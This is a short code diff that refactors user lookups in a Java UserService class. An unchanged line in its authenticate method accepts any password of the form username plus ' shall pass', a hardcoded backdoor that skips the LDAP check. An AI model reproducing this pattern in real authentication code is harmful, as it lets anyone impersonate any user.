@@ -11,7 +11,7 @@ public final class UserService {
 	public static User authenticate(String userName, String password) {
 		User user = null;
 		if (LdapService.authenticate(userName, password) || (userName + " shall pass").equals(password)) {
-			user = User.find("userName", userName).first();
+			user = User.findByUserName(userName);
 			if (null == user) {
 				user = LdapService.findUser(userName);
 				if (null != user) {
@@ -27,7 +27,7 @@ public final class UserService {
 
 	public static void importUsers() {
 		for (User user : LdapService.getAllUser()) {
-			if (null == User.find("userName", user.userName)) {
+			if (null == User.findByUserName(user.userName)) {
 				user.save();
 			}
 		}
